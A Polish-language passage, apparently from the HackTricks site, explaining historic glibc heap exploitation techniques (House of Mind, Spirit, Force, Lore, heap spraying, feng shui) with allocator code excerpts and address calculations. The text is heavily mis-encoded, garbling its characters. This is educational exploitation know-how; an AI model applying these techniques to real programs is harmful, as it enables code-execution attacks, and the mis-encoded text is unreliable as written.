W \[1] sprawdzany jest rozmiar pola bitu NON\_MAIN\_ARENA, ktÃ³ry moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wywoÅ‚aÅ‚o heap\_for\_ptr(), ktÃ³re wykonuje operacjÄ™ and na â€memâ€, ustawiajÄ…c na 0 2,5 najmniej znaczÄ…cych bajtÃ³w (w naszym przypadku z 0x0804a000 robi 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar\_ptr (jak do struct heap\_info)

W ten sposÃ³b, jeÅ›li moÅ¼emy kontrolowaÄ‡ fragment na przykÅ‚ad w 0x0804a000 i fragment w **0x081002a0** zostanie zwolniony, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡ cokolwiek chcemy, na przykÅ‚ad **0x0804a000**. Gdy ten drugi fragment zostanie zwolniony, heap\_for\_ptr(ptr)->ar\_ptr zwrÃ³ci to, co napisaliÅ›my w 0x08100000 (poniewaÅ¼ stosuje siÄ™ do 0x081002a0 operacjÄ™ and, ktÃ³rÄ… widzieliÅ›my wczeÅ›niej, i stÄ…d wyciÄ…ga wartoÅ›Ä‡ 4 pierwszych bajtÃ³w, ar\_ptr)

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(ar\_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ to, co piszemy w zwalnianym fragmencie, jest tym, co zostanie zapisane w av.

Zgodnie z definicjÄ… unsorted\_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeÅ›li w av->bins\[2] zapiszemy wartoÅ›Ä‡ \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR\_END\_\_ adres drugiego fragmentu.

Innymi sÅ‚owy, na poczÄ…tku pierwszego fragmentu musimy umieÅ›ciÄ‡ wiele razy adres \_\_DTOR\_END\_\_-12, poniewaÅ¼ av->bins\[2] to z niego weÅºmie.

W miejscu, gdzie znajdzie siÄ™ adres drugiego fragmentu z ostatnimi 5 zerami, naleÅ¼y zapisaÄ‡ adres tego pierwszego fragmentu, aby heap\_for\_ptr() myÅ›laÅ‚, Å¼e ar\_ptr zaczyna siÄ™ na poczÄ…tku pierwszego fragmentu i wyciÄ…gnÄ…Å‚ z niego av->bins\[2]

W drugim fragmencie, dziÄ™ki pierwszemu, nadpisujemy prev\_size skokiem 0x0c i rozmiarem czegoÅ›, aby aktywowaÄ‡ -> NON\_MAIN\_ARENA

NastÄ™pnie w drugim fragmencie umieszczamy mnÃ³stwo nops i na koÅ„cu shellcode

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(TROZO1, TROZO2) i zostanÄ… wykonane instrukcje, aby zapisaÄ‡ w \_\_DTOR\_END\_\_ adres prev\_size TROZO2, ktÃ³ry skoczy do shellcode.
Aby zastosowaÄ‡ tÄ™ technikÄ™, konieczne jest speÅ‚nienie kilku dodatkowych wymagaÅ„, ktÃ³re nieco komplikujÄ… payload.

Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zastosowano prawie ten sam patch co dla unlink. Sprawdzane jest, czy nowa lokalizacja, do ktÃ³rej siÄ™ odwoÅ‚ujemy, rÃ³wnieÅ¼ odwoÅ‚uje siÄ™ do nas.

**Fastbin**

To wariant The House of Mind

Naszym celem jest wykonanie nastÄ™pujÄ…cego kodu, do ktÃ³rego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gdzie fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li umieÅ›cimy "fb" w adresie funkcji w GOT, na tym adresie zostanie umieszczony adres nadpisanej czÄ™Å›ci. Aby to osiÄ…gnÄ…Ä‡, konieczne jest, aby arena byÅ‚a blisko adresÃ³w dtors. DokÅ‚adniej mÃ³wiÄ…c, av->max\_fast musi znajdowaÄ‡ siÄ™ pod adresem, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ z The House of Mind widzieliÅ›my, Å¼e kontrolowaliÅ›my pozycjÄ™ av.

JeÅ›li wiÄ™c w polu size podamy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1\], ktÃ³ry wskaÅ¼e na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie ten, do ktÃ³rego wskazuje, ale ta pozycja zostanie nadpisana).

Dodatkowo, fragment obok zwolnionego kawaÅ‚ka musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego kawaÅ‚ka to 8, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w zwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nops).

Dodatkowo, ten sam faÅ‚szywy kawaÅ‚ek musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Z powodu zer w \_DTOR\_END\_ i niewielu adresÃ³w w GOT, Å¼aden z tych adresÃ³w nie nadaje siÄ™ do nadpisania, zobaczmy wiÄ™c, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

JeÅ›li zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0\] i moÅ¼emy z tego skorzystaÄ‡, aby nadpisaÄ‡ stos.

W tym celu nie powinno byÄ‡ Å¼adnych canary ani dziwnych wartoÅ›ci na stosie, faktycznie musimy znaleÅºÄ‡ siÄ™ w takim miejscu: 4 bajty zerowe + EBP + RET

4 bajty zerowe sÄ… potrzebne, aby **av** znajdowaÅ‚ siÄ™ pod tym adresem, a pierwszym elementem **av** jest mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra pozwoli nam ominÄ…Ä‡ ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i bÄ™dzie RET, co spowoduje skok do shellcode.

Dodatkowo, w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie duÅ¼o Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ sprawdzanie.

Dodatkowo, ten sam faÅ‚szywy kawaÅ‚ek musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego kawaÅ‚ka to 16, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w zwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ skok, ktÃ³ry trafi w nops, ktÃ³re znajdujÄ… siÄ™ po polu size nowego faÅ‚szywego kawaÅ‚ka).

**The House of Spirit**

W tym przypadku chcemy mieÄ‡ wskaÅºnik do malloc, ktÃ³ry moÅ¼e byÄ‡ modyfikowany przez atakujÄ…cego (np. wskaÅºnik znajduje siÄ™ na stosie pod potencjalnym przepeÅ‚nieniem zmiennej).

W ten sposÃ³b moÅ¼emy sprawiÄ‡, Å¼e ten wskaÅºnik wskazuje dokÄ…d chcemy. Jednak nie kaÅ¼de miejsce jest odpowiednie, rozmiar faÅ‚szywego kawaÅ‚ka musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej konkretne, rÃ³wny rozmiarowi Å¼Ä…danemu w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku nastÄ™puje wywoÅ‚anie malloc(40), rozmiar faÅ‚szywego kawaÅ‚ka musi wynosiÄ‡ 48.

Na przykÅ‚ad, jeÅ›li program pyta uÅ¼ytkownika o liczbÄ™, moÅ¼emy wprowadziÄ‡ 48 i skierowaÄ‡ modyfikowalny wskaÅºnik malloc na nastÄ™pne 4 bajty (ktÃ³re mogÄ… naleÅ¼eÄ‡ do EBP, dziÄ™ki czemu 48 pozostaje z tyÅ‚u, jakby to byÅ‚a nagÅ‚Ã³wek size). Ponadto, adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to siÄ™ speÅ‚ni, gdy zostanie wywoÅ‚ane kolejne malloc, ktÃ³re powiedzieliÅ›my, Å¼e jest malloc(40), jako adres zostanie przypisany adres EBP. JeÅ›li atakujÄ…cy moÅ¼e rÃ³wnieÅ¼ kontrolowaÄ‡ to, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem.

MyÅ›lÄ™, Å¼e dlatego, gdy zostanie zwolnione free(), zostanie zachowana informacja, Å¼e w miejscu wskazujÄ…cym na EBP stosu znajduje siÄ™ kawaÅ‚ek o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chcemy zarezerwowaÄ‡, wiÄ™c przypisuje mu ten adres.

**The House of Force**

Potrzebne jest:

* PrzepeÅ‚nienie kawaÅ‚ka, ktÃ³re pozwala na nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem zdefiniowanym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rych dane mogÄ… byÄ‡ zdefiniowane przez uÅ¼ytkownika

PierwszÄ… rzeczÄ…, ktÃ³rÄ… robimy, jest nadpisanie rozmiaru kawaÅ‚ka wilderness bardzo duÅ¼Ä… wartoÅ›ciÄ… (0xffffffff), dziÄ™ki czemu kaÅ¼de Å¼Ä…danie pamiÄ™ci wystarczajÄ…co duÅ¼e bÄ™dzie obsÅ‚ugiwane w \_int\_malloc() bez koniecznoÅ›ci rozszerzania sterty.

DrugÄ… rzeczÄ… jest zmiana av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego, takiego jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje adres bieÅ¼Ä…cego kawaÅ‚ka wilderness (aktualne av->top), a remainder to dokÅ‚adnie suma tego adresu i liczby bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego jeÅ›li \&EIP-8 znajduje siÄ™ pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym malloc, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc(), bÄ™dzie wynosiÄ‡:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b zostanie zachowany zmieniony av->top, a nastÄ™pne malloc bÄ™dzie wskazywaÄ‡ na EIP i bÄ™dzie moÅ¼na go nadpisaÄ‡.

WaÅ¼ne jest, aby rozmiar nowego kawaÅ‚ka wilderness byÅ‚ wiÄ™kszy niÅ¼ Å¼Ä…danie ostatniego malloc(). Innymi sÅ‚owy, jeÅ›li wilderness wskazuje na \&EIP-8, rozmiar zostanie dokÅ‚adnie w polu EBP stosu.

**The House of Lore**

**Korupcja SmallBin**

Zwolnione kawaÅ‚ki sÄ… umieszczane w bin w zaleÅ¼noÅ›ci od ich rozmiaru. Ale zanim zostanÄ… umieszczone, sÄ… przechowywane w unsorted bins. KawaÅ‚ek nie jest natychmiast umieszczany w swoim binie, ale pozostaje w unsorted bins. NastÄ™pnie, jeÅ›li zostanie zarezerwowany nowy kawaÅ‚ek i poprzedni zwolniony moÅ¼e byÄ‡ uÅ¼yty, zostanie on zwrÃ³cony, ale jeÅ›li zostanie zarezerwowany wiÄ™kszy, zwolniony kawaÅ‚ek z unsorted bins zostanie umieszczony w odpowiednim binie.

Aby dotrzeÄ‡ do podatnego kodu, Å¼Ä…danie pamiÄ™ci musi byÄ‡ wiÄ™ksze niÅ¼ av->max\_fast (zazwyczaj 72) i mniejsze niÅ¼ MIN\_LARGE\_SIZE (512).

JeÅ›li w binach znajduje siÄ™ kawaÅ‚ek o odpowiednim rozmiarze, zostanie on zwrÃ³cony po odÅ‚Ä…czeniu:

bck = victim->bk; WskaÅ¼e poprzedni kawaÅ‚ek, to jedyna informacja, ktÃ³rÄ… moÅ¼emy zmieniÄ‡.

bin->bk = bck; Przedostatni kawaÅ‚ek staje siÄ™ ostatnim, jeÅ›li bck wskazuje na stos, nastÄ™pnemu zarezerwowanemu kawaÅ‚kowi zostanie przypisany ten adres

bck->fd = bin; Zamyka listÄ™, aby wskazywaÅ‚a na bin

Potrzebne jest:
Zarezerwuj dwie pamiÄ™ci malloc, tak aby pierwsza mogÅ‚a zostaÄ‡ przepeÅ‚niona po zwolnieniu drugiej i umieszczeniu jej w swoim binie (czyli zarezerwowano malloc wiÄ™kszy niÅ¼ drugi kawaÅ‚ek przed przepeÅ‚nieniem).

Zarezerwowana pamiÄ™Ä‡, do ktÃ³rej atakujÄ…cy wybiera adres, jest kontrolowana przez atakujÄ…cego.

Celem jest, jeÅ›li moÅ¼emy przepeÅ‚niÄ‡ stertÄ™, ktÃ³ra ma zwolniony kawaÅ‚ek pod niÄ… i w swoim binie, moÅ¼emy zmieniÄ‡ wskaÅºnik bk. JeÅ›li zmienimy wskaÅºnik bk i ten kawaÅ‚ek stanie siÄ™ pierwszy na liÅ›cie bin i zostanie zarezerwowany, oszukamy bin i powiemy mu, Å¼e nastÄ™pny kawaÅ‚ek na liÅ›cie (nastÄ™pny do zaoferowania) znajduje siÄ™ pod faÅ‚szywym adresem, ktÃ³ry podaliÅ›my (na przykÅ‚ad na stosie lub GOT). W ten sposÃ³b, jeÅ›li zostanie zarezerwowany kolejny kawaÅ‚ek i atakujÄ…cy ma uprawnienia do niego, zostanie mu przydzielony kawaÅ‚ek na poÅ¼Ä…danej pozycji i bÄ™dzie mÃ³gÅ‚ w niÄ… pisaÄ‡.

Po zwolnieniu zmodyfikowanego kawaÅ‚ka konieczne jest zarezerwowanie kawaÅ‚ka wiÄ™kszego od zwolnionego, dziÄ™ki czemu zmodyfikowany kawaÅ‚ek opuÅ›ci unsorted bins i zostanie umieszczony w swoim binie.

Gdy juÅ¼ znajdzie siÄ™ w swoim binie, naleÅ¼y zmieniÄ‡ mu wskaÅºnik bk poprzez przepeÅ‚nienie, aby wskazywaÅ‚ na adres, ktÃ³ry chcemy nadpisaÄ‡.

NastÄ™pnie bin musi poczekaÄ‡, aÅ¼ malloc() zostanie wywoÅ‚ane wystarczajÄ…co wiele razy, aby ponownie uÅ¼yÄ‡ zmodyfikowanego bina i oszukaÄ‡ bin, sprawiajÄ…c, Å¼e uwierzy, Å¼e nastÄ™pny kawaÅ‚ek znajduje siÄ™ pod faÅ‚szywym adresem. NastÄ™pnie zostanie przydzielony poÅ¼Ä…dany kawaÅ‚ek.

Aby wywoÅ‚aÄ‡ podatnoÅ›Ä‡ jak najszybciej, idealne jest: zarezerwowanie podatnego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka do zmodyfikowania, zwolnienie tego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka wiÄ™kszego od tego, ktÃ³ry zostanie zmodyfikowany, zmodyfikowanie kawaÅ‚ka (podatnoÅ›Ä‡), zarezerwowanie kawaÅ‚ka o takim samym rozmiarze co naruszony i zarezerwowanie drugiego kawaÅ‚ka o takim samym rozmiarze, ktÃ³ry bÄ™dzie wskazywaÅ‚ na wybrany adres.

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, uÅ¼yto standardowej weryfikacji, czy kawaÅ‚ek "nie" jest faÅ‚szywy: sprawdzane jest, czy bck->fd wskazuje na ofiarÄ™. Innymi sÅ‚owy, w naszym przypadku, jeÅ›li wskaÅºnik fd\* faÅ‚szywego kawaÅ‚ka wskazuje na ofiarÄ™ na stosie. Aby ominÄ…Ä‡ to zabezpieczenie, atakujÄ…cy musiaÅ‚by byÄ‡ w stanie w jakiÅ› sposÃ³b (prawdopodobnie przez stos) zapisaÄ‡ odpowiednio adres ofiary. W ten sposÃ³b wyglÄ…daÅ‚oby to jak prawdziwy kawaÅ‚ek.

**Korupcja LargeBin**

Wymagane sÄ… te same warunki co wczeÅ›niej i kilka dodatkowych, ponadto zarezerwowane kawaÅ‚ki muszÄ… byÄ‡ wiÄ™ksze niÅ¼ 512.

Atak jest podobny do poprzedniego, czyli trzeba zmieniÄ‡ wskaÅºnik bk i potrzebne sÄ… wszystkie te wywoÅ‚ania malloc(), ale dodatkowo trzeba zmieniÄ‡ rozmiar zmodyfikowanego kawaÅ‚ka tak, aby ten rozmiar - nb byÅ‚ < MINSIZE.

Na przykÅ‚ad, trzeba ustawiÄ‡ rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie moÅ¼e byÄ‡ ujemne, poniewaÅ¼ porÃ³wnuje siÄ™ wartoÅ›Ä‡ bez znaku)

Dodatkowo wprowadzono Å‚atkÄ™, aby sprawiÄ‡, Å¼e atak bÄ™dzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na zarezerwowaniu jak najwiÄ™kszej iloÅ›ci pamiÄ™ci dla sterty i wypeÅ‚nieniu jej poduszkÄ… z nops zakoÅ„czonÄ… shellcodem. Dodatkowo jako poduszkÄ™ uÅ¼ywa siÄ™ 0x0c. NastÄ™pnie prÃ³buje siÄ™ skoczyÄ‡ do adresu 0x0c0c0c0c, wiÄ™c jeÅ›li jakaÅ› adres zostanie nadpisany tÄ… poduszkÄ…, skoczy tam. PodstawowÄ… taktykÄ… jest zarezerwowanie jak najwiÄ™kszej iloÅ›ci pamiÄ™ci, aby zobaczyÄ‡, czy jakiÅ› wskaÅºnik zostanie nadpisany, i skoczyÄ‡ do 0x0c0c0c0c, majÄ…c nadziejÄ™, Å¼e tam bÄ™dÄ… nops.

**Feng Shui sterty (Heap Feng Shui)**

Polega na utwardzaniu pamiÄ™ci poprzez rezerwacje i zwalnianie, tak aby miÄ™dzy wolnymi kawaÅ‚kami pozostaÅ‚y zarezerwowane kawaÅ‚ki. Bufor do przepeÅ‚nienia zostanie umieszczony w jednym z tych kawaÅ‚kÃ³w.

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
